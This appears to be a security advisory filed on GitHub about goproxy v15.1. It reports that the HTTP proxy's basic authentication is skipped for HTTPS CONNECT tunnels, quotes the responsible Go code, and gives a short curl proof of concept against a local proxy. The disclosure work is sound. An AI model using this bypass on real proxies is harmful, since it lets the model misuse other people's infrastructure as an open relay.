
https://github.com/snail007/

 - 13 June 2026 - opened https://github.com/snail007/goproxy/issues/589
 - 30 July 2026 - tried to follow up, found issue to be closed, opening .md here

## Finding: HTTP proxy basic authentication bypass via HTTPS CONNECT tunnel

Affected Versions: confirmed on v15.1

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

CWE: CWE-306 -- Missing Authentication for Critical Function
 

### Summary

When goproxy's HTTP proxy mode is configured with basic authentication (`-a user:pass` or `-F authfile`), the authentication check is applied only to plain HTTP requests. HTTPS CONNECT tunnel requests bypass authentication entirely, allowing any unauthenticated client to use the proxy as an open relay to reach any TCP destination on port 443 (or any port via CONNECT).

### Details

The authentication logic is implemented in `utils/structs.go` in the `NewHTTPRequest` function (lines 268-277). After parsing the request, it dispatches to either `req.HTTP()` or `req.HTTPS()` depending on whether the method is `CONNECT`:

```go
// utils/structs.go lines 272-276
if req.IsHTTPS() {
    err = req.HTTPS()
} else {
    err = req.HTTP()
}
```

The `HTTP()` method calls `BasicAuth()` when authentication is configured:

```go
// utils/structs.go lines 279-285
func (req *HTTPRequest) HTTP() (err error) {
    if req.isBasicAuth {
        err = req.BasicAuth()
        if err != nil {
            return
        }
    }
    ...
}
```

The `HTTPS()` method, which handles all CONNECT tunnel requests, does not check authentication at all:

```go
// utils/structs.go lines 294-299
func (req *HTTPRequest) HTTPS() (err error) {
    req.Host = req.hostOrURL
    req.addPortIfNot()
    return
}
```

There is no authentication check anywhere else in the CONNECT handling path (`services/http.go` `callback` -> `OutToTCP`). The proxy then immediately returns `HTTP/1.1 200 Connection established` and relays all traffic without verifying credentials.

### PoC

Prerequisites: goproxy binary built from v15.1 source, self-signed TLS certificate (proxy.crt/proxy.key) for the proxy listener.

```bash
# Start proxy with authentication enabled on port 18080
./proxy http -p :18080 -t tcp -C proxy.crt -K proxy.key -a testuser:testpass &

# Step 1: Confirm auth is enforced for plain HTTP requests (expect 401)
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
    --proxy http://127.0.0.1:18080 \
    http://example.com/
# Output:
# HTTP Status: 401

# Step 2: HTTPS CONNECT without any credentials - auth is bypassed (expect 200)
curl -s -o /dev/null -w "Proxy Connect Status: %{http_connect}\nFinal HTTP Status: %{http_code}\n" \
    --proxy http://127.0.0.1:18080 \
    https://example.com/
# Output:
# Proxy Connect Status: 200
# Final HTTP Status: 200
```

The CONNECT tunnel is established and the request to example.com succeeds without providing any credentials, demonstrating that an unauthenticated client can bypass the proxy's access control via HTTPS CONNECT.

### Impact

Any network-reachable unauthenticated client can use a credential-protected goproxy HTTP proxy as an open relay for all HTTPS traffic. This allows bypassing access controls intended to restrict proxy usage, enables proxying traffic through a presumably trusted host to reach otherwise firewalled destinations, and leaks the proxy operator's outbound IP address for any connection the attacker chooses to tunnel. The bypass is trivially exploitable with any standard HTTP client or browser.
